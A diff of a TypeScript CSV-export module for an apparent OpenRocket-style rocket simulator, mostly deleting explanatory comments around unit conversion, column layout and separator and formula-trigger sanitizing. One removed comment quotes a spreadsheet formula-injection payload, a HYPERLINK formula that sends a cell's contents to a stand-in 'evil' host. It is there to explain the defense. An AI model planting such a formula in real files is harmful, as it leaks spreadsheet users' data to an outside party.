@@ -18,17 +18,6 @@ import { plainDecimal } from '../files/numberText';
 import { csvField, csvQuoted, neutralizeFormula } from './csvCell';
 import { componentName, isDefaultComponentName } from '../app/warningText';
 
-/**
- * CSV exporters for the flight time-series and the drag sweep. Columns are
- * written in the user's chosen units, and every header cell names the unit it
- * carries, so a file stays self-describing whatever the preference was when it
- * was written. Numbers use '.' as the decimal separator regardless of locale.
- *
- * A unit with an offset (air temperature in the flight series) is converted
- * value by value with `siToUi`, since a kelvin reading is not a multiple of its
- * Celsius or Fahrenheit reading. Every other column is scaled by one
- * `siToUiDelta` factor.
- */
 const EOL = '\r\n';
 
 const cell = (v: number | null | undefined, digits?: number): string => {
@@ -39,54 +28,22 @@ const mul = (v: number | null | undefined, f: number): number | null =>
   v == null || !Number.isFinite(v) ? null : v * f;
 const row = (cells: (string | number)[]): string => cells.join(',');
 
-/** Resolves an i18n key, as the caller's `t` does. */
 export type CsvTranslate = (key: string, vars?: Record<string, unknown>) => string;
 
-/** A translated column title with the unit its cells carry. */
 const titled = (title: string, unit?: string): string => csvField(unit ? `${title} (${unit})` : title);
 
-/**
- * A text cell holding the user's own words or a translation: names come from
- * the design, so they can hold a comma or a newline, and neither may split the
- * row. Quoted rather than stripped, newlines flattened. Quoting alone does not
- * stop spreadsheet formula injection: Excel and Sheets strip the quoting before
- * evaluating, so a recovery device named `=HYPERLINK("http://evil/?"&A1,"Open")`
- * in a shared .ork would execute when the CSV is opened. `csvQuoted` applies
- * the shared rule, which neutralizes a trigger at the start and after an
- * embedded separator.
- */
 const textCell = (v: string): string => csvQuoted(v.replace(/[\r\n]+/g, ' '));
 
 type UnitCol = { f: number; sym: string };
 
-/** A column's SI→display multiplier and the symbol its header should name. */
 const col = (units: UnitSelection, q: Quantity): UnitCol => ({
   f: siToUiDelta(q, units[q], 1),
   sym: units[q],
 });
 
-/**
- * How a flight CSV is written: which columns, in what format, with which
- * comments: OpenRocket's own Export data options, which it keeps in
- * `CsvOptionPanel` and the export panel beside it.
- *
- * All of it is the user's choice: a fixed twelve columns, comma separated, six
- * significant digits with the event lines always on is one opinion about a file
- * somebody else has to read.
- */
 export interface FlightCsvOptions extends Omit<CsvFormat, 'columns'> {
-  /** Series keys to write, in `flightColumns` order. */
   columns: readonly string[];
-  /** Which branch of a staged flight to write. */
   branchIndex: number;
-  /**
-   * The human name for a column.
-   *
-   * Passed in because the names are translated and this service has no
-   * translator: it is plain TypeScript, called from a dialog and from tests
-   * alike. A column with no name of its own falls back to its kernel symbol,
-   * which is what a symbol-only series has anyway.
-   */
   columnName: (c: FlightColumn) => string;
 }
 
@@ -96,26 +53,12 @@ const DEFAULT_CSV_OPTIONS: FlightCsvOptions = {
   columnName: (c) => c.key,
 };
 
-/** One value, formatted per the options. Blank for a gap, so a hole reads as one. */
 function value(v: number | null | undefined, o: FlightCsvOptions): string {
   if (v == null || !Number.isFinite(v)) return '';
   return o.exponential ? v.toExponential(o.decimals) : v.toFixed(o.decimals);
 }
 
-/**
- * Per-timestep flight data, in the user's units, with the columns and format the
- * caller asked for.
- *
- * The layout follows OpenRocket's CSV export: the simulation comments, a bare
- * comment line, the field names as one commented line, then the data rows with
- * each event comment among them at its time. The comment text differs: desktop
- * writes the simulation name with its status and ` (unit)` after every field
- * name even when the unit is empty; this writes `Simulation:` and `Stage:` lines
- * and no empty brackets. A script that parses the structure reads both.
- *
- * `name` titles the simulation-description comment; it is passed in because this
- * service has no view of the workspace.
- */
+/** Layout matches OpenRocket's CSV export so its parsers read this file too. */
 export function flightDataCsv(
   r: FlightResult,
   units: UnitSelection,
@@ -127,14 +70,7 @@ export function flightDataCsv(
   const series = branchSeries(r, o.branchIndex);
   const branch = r.branches?.length ? r.branches[o.branchIndex] : undefined;
   const sep = o.separator;
-  // Text here (column headers and comment lines, which carry the simulation and
-  // stage names from a shared .ork) is never quoted, so whatever a spreadsheet
-  // might split on is replaced with a space: the chosen separator, and `,` `;`
-  // and tab whatever the separator is, because Excel splits a `.csv` on its
-  // locale's list separator rather than the file's. CR and LF would end the
-  // line. A formula trigger is neutralized where a cell can still begin: the
-  // start of the text, which begins a header cell, and with the space
-  // separator after every space.
+  // Headers are never quoted, so every possible separator becomes a space (Excel uses its locale's).
   const clean = (text: string) => {
     const flat = text
       .split(sep)
@@ -144,9 +80,7 @@ export function flightDataCsv(
   };
 
   const unitOf = (c: (typeof cols)[number]): string => (c.quantity ? units[c.quantity] : (c.unit ?? ''));
-  // A column's SI to display conversion. A unit whose zero is not SI zero
-  // (°C, °F) goes through `siToUi` per value, because a multiplier drops the
-  // offset: 288.15 K is 15 °C, not 288.15. The rest keep one factor.
+  // A unit with an offset (°C, °F) needs `siToUi`: a multiplier drops the offset.
   const convertOf = (c: (typeof cols)[number]): ((si: number) => number) => {
     const q = c.quantity;
     if (q && siToUi(q, units[q], 0) !== 0) {
@@ -163,13 +97,10 @@ export function flightDataCsv(
   const n = series?.['time']?.length ?? 0;
 
   if (o.simDescription && name) comment(`Simulation: ${clean(name)}`);
-  // The kernel's default name for a stage nobody named is a lookup key, not a
-  // name; the comment lines are English, so it reads as the stage's number.
+  // A default stage name is a lookup key, not text.
   if (o.simDescription && branch?.name)
     comment(`Stage: ${isDefaultComponentName(branch.name.trim()) ? `Stage ${o.branchIndex + 1}` : clean(branch.name)}`);
   if (o.simDescription) comment(`${n} data points written for ${cols.length} variables.`);
-  // The field names are the one header the file has, and only on request: a
-  // commented line, so a reader that skips comments reads data from the top.
   if (o.simDescription && o.fieldDescriptions) lines.push(o.commentChar);
   if (o.fieldDescriptions) {
     comment(
@@ -182,9 +113,6 @@ export function flightDataCsv(
     );
   }
 
-  // Events in time order, each written just before the first sample at or after
-  // it, and any past the last sample after the data. Without a time series
-  // there is nothing to place them against, so they lead the data.
   const events = o.flightEvents ? [...(branch?.events ?? r.events ?? [])].sort((a, b) => a.time - b.time) : [];
   const time = series?.['time'];
   let next = 0;
@@ -212,21 +140,13 @@ export function flightDataCsv(
   return lines.join(EOL) + EOL;
 }
 
-/** Cd / CP / CNα vs Mach, with the friction/pressure/base split and per-component Cd. */
 export function aeroTableCsv(d: AeroSweep, units: UnitSelection): string {
   const len = col(units, 'length');
-  // A component name comes from the design, often a shared .ork. The `Cd_`
-  // prefix keeps a trigger from leading the field, but a `,` `;` or tab inside
-  // the name opens a new cell in a spreadsheet that splits on it, so the header
-  // goes through the shared CSV field rule like every other text cell. Line
-  // breaks become spaces, since a header is one line; brackets are dropped.
+  // `Cd_` blocks a leading trigger, but an embedded separator still needs `csvField`.
   const compHeader = (name: string) => `Cd_${name.replace(/[[\]]/g, '').replace(/[\r\n]+/g, ' ')}`;
   const header = ['Mach', 'Cd', 'Cd_friction', 'Cd_pressure', 'Cd_base'];
   if (d.hasNozzle) header.push('Cd_powerOn');
   header.push(`CP (${len.sym})`, 'CNalpha (/rad)');
-  // Components are identified by a stable key, not by name, so two unnamed body
-  // tubes arrive as two distinct columns rather than one merged one. Number the
-  // repeats so the header still says which column is which.
   const seen = new Map<string, number>();
   for (const c of d.components) {
     const base = compHeader(c.name);
@@ -253,26 +173,6 @@ export function aeroTableCsv(d: AeroSweep, units: UnitSelection): string {
   return lines.join(EOL) + EOL;
 }
 
-/**
- * The flight's events, one row each, with the state of the rocket at that
- * instant: the timeline the Results tab shows, as a file.
- *
- * Every extra gets a column of its own here, where the table on screen puts
- * them on a sub-line: a table has 380px and a file has none, and a spreadsheet
- * wants a rectangle it can sort and chart rather than prose in a cell. Most
- * rows leave most of those columns blank, which is the honest shape: only the
- * rail-departure row has a thrust-to-weight, and a blank cell says so.
- *
- * `t`, `eventName` and `stageName` are passed in for the reason `columnName` is
- * above: the headers and the cells are translated, and this service has no
- * translator, so a file is in one language throughout. `stageName`
- * also owns the "Stage 2" fallback for a branch the engine did not name, which
- * is the same split `buildTraces` and the table itself make.
- *
- * Separate from {@link flightDataCsv}, which writes the per-timestep series and
- * can already carry the events as comment lines. A comment is for a reader; the
- * question this answers is "give me the events as data".
- */
 export function flightEventsCsv(
   rows: readonly EventRow[],
   units: UnitSelection,
@@ -285,13 +185,9 @@ export function flightEventsCsv(
   const vel = col(units, 'velocity');
   const ang = col(units, 'angle');
   const pres = col(units, 'pressure');
-  // An absent name is an empty cell rather than an empty quoted one.
   const text = (v: string | undefined): string => (v ? textCell(v) : '');
 
   const lines: string[] = [];
-  // The title line is a comment, not a quoted field, so a separator in the
-  // simulation name would open a second cell a spreadsheet evaluates. Comma,
-  // semicolon and tab all go: a locale that splits on `;` reads this file too.
   if (name) lines.push(`# ${t('csv.head.simulationLine', { name }).replace(/[\r\n,;\t]+/g, ' ')}`);
   lines.push(
     row([
@@ -313,8 +209,6 @@ export function flightEventsCsv(
       row([
         cell(r.time, 3),
         text(eventName(r)),
-        // A part the user never named arrives under the kernel's default name,
-        // an untranslated bundle key, which reads as the part's type.
         text(r.source && componentName(r.source, t)),
         text(stageName(r)),
         cell(mul(r.altitude, dist.f)),
@@ -330,22 +224,15 @@ export function flightEventsCsv(
   return lines.join(EOL) + EOL;
 }
 
-/** One simulation as the run table writes it. */
 export interface RunTableRow {
   name: string;
-  /** The configuration's name, or what it flies when it has none. */
   configuration: string;
-  /** The motors it flies, e.g. "Estes C6-5". */
   motors: string;
-  /** Up to date, Outdated, Not run: the table's own status, translated by the caller. */
   status: string;
-  /** The last run, which for an outdated row describes a design since edited. */
   result?: FlightResult | null;
-  /** A .ork's summary for a simulation not flown here; the figures it has, no peaks. */
   fileSummary?: FlightSummary;
 }
 
-/** The units the flight tables write in, and the translator that names the launcher. */
 function peakColumns(units: UnitSelection, t: CsvTranslate, launcher: LauncherKind | null) {
   return {
     lt: withLauncher(t, launcher),
@@ -355,7 +242,6 @@ function peakColumns(units: UnitSelection, t: CsvTranslate, launcher: LauncherKi
   };
 }
 
-/** The peak headers both flight tables carry, in this order, so the two files read alike. */
 function peakHeads(t: CsvTranslate, c: ReturnType<typeof peakColumns>): string[] {
   return [
     titled(t('csv.head.apogee'), c.dist.sym),
@@ -366,15 +252,6 @@ function peakHeads(t: CsvTranslate, c: ReturnType<typeof peakColumns>): string[]
   ];
 }
 
-/**
- * The run table: one row per simulation with the figures the simulations table
- * shows and the peaks the summary adds, in the user's units, each header naming
- * its unit. A row that has never flown keeps its name and leaves the figures
- * blank rather than being dropped, so the file lists every simulation.
- *
- * `t` translates the headers, as the caller translates the status cells; the
- * exit column names the launcher the way the design does (`withLauncher`).
- */
 export function runTableCsv(
   rows: readonly RunTableRow[],
   units: UnitSelection,
@@ -384,7 +261,6 @@ export function runTableCsv(
   const c = peakColumns(units, t, launcher);
   const { dist, vel, acc } = c;
   const pres = col(units, 'pressure');
-  // q·α is Pa·rad in SI, written in the pressure unit times the angle unit.
   const ang = col(units, 'angle');
   const roll = col(units, 'rollRate');
   const text = textCell;
@@ -434,7 +310,6 @@ export function runTableCsv(
   return lines.join(EOL) + EOL;
 }
 
-/** A guide row's motor as both guide tables open it: who made it and how much it is. */
 interface GuideMotorCells {
   motor: string;
   manufacturer: string;
@@ -458,23 +333,14 @@ const motorCells = (r: GuideMotorCells, imp: UnitCol, force: UnitCol): string[] 
   cell(mul(avgThrustOf(r.row.motor), force.f)),
 ];
 
-/** One motor guide row as the guide table writes it. */
 export interface GuideTableRow {
-  /** The motor's name, e.g. "F67W". */
   motor: string;
   manufacturer: string;
-  /** The delay it was flown at, as the table shows it ("7", "P"). */
   delay: string;
-  /** What the guide found wrong, translated by the caller; empty for a clean flight. */
   status: string;
   row: GuideRow;
 }
 
-/**
- * The motor guide table: one row per candidate motor, in the user's units, with
- * the figures the guide shows. The same shape as the run table, so the two
- * files read alike side by side.
- */
 export function motorGuideCsv(
   rows: readonly GuideTableRow[],
   units: UnitSelection,
@@ -524,26 +390,16 @@ export function motorGuideCsv(
   return lines.join(EOL) + EOL;
 }
 
-/** The MIME type the CSV exports are served under. */
 export const CSV_MIME = 'text/csv;charset=utf-8';
 
-/** One simple-rocket guide row as its table writes it. */
 export interface SimpleGuideTableRow {
   motor: string;
   manufacturer: string;
-  /** The delay it is seated at, as the table shows it ("7", "P"). */
   delay: string;
-  /** What the guide found wrong, translated by the caller; empty for a clean flight. */
   status: string;
   row: SimpleGuideRow;
 }
 
-/**
- * The simple rocket's motor guide table: one row per motor, in the user's
- * units, under the headings the design's guide file uses, so the two read
- * alike. Stability and the descent are written only when the guide flew them
- * (a CG, a parachute), rather than as columns of blanks.
- */
 export function simpleGuideCsv(rows: readonly SimpleGuideTableRow[], units: UnitSelection, t: CsvTranslate): string {
   const dist = col(units, 'distance');
   const vel = col(units, 'velocity');
